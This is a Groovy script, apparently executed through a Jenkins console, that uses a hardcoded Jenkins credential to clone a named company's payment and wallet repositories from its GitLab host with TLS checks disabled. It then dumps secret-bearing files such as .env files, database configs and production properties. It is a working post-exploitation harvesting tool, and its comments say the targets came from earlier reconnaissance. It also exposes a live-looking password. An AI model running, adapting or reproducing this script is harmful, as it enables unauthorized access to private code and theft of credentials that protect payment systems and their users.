// MICRO-P: Clone caja group repos + read sensitive files
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(30000)
    out.toString().take(5000)
}

def cloneAndRead = { repoPath ->
    def dest = "/tmp/gl_${repoPath.replace('/','_')}"
    def creds = "jenkins:e6LBqIkOI\$PR1XX2oia"
    def cloneUrl = "https://${creds}@gitlab.dev.claroshop.com/${repoPath}.git"
    
    // Clone
    run("rm -rf '${dest}' && GIT_TERMINAL_PROMPT=0 git -c http.sslVerify=false clone --depth=1 '${cloneUrl}' '${dest}' 2>&1 | tail -3")
    
    // Read sensitive files
    def files = [".env", ".env.production", ".env.local", ".env.example",
                 "config/local.php", "config/database.yml", "docker-compose.yml",
                 "src/main/resources/application.properties",
                 "src/main/resources/application-prod.properties"]
    def found = []
    files.each { f ->
        def content = run("cat '${dest}/${f}' 2>/dev/null")
        if (content.trim()) found << [file: f, content: content.take(1000)]
    }
    found
}

// From USERVAR grep, caja is the key - try cloning known repos from caja group
// Also try claroshop namespace repos
def repos = ["caja/caja-pagos", "caja/t1-integration", "caja/axii-integration",
             "claroshop/axii-claroshop", "claroshop/caja-pagos-api",
             "claroshop/monedero-api", "claroshop/tienda_claroshop"]

repos.each { repo ->
    println "\n=== CLONE: ${repo} ==="
    def results = cloneAndRead(repo)
    if (results) {
        results.each { r ->
            println "  FILE: ${r.file}"
            println r.content
        }
    } else {
        println "  No sensitive files found (or clone failed)"
    }
}

println "\n=== DONE MICRO-P ==="
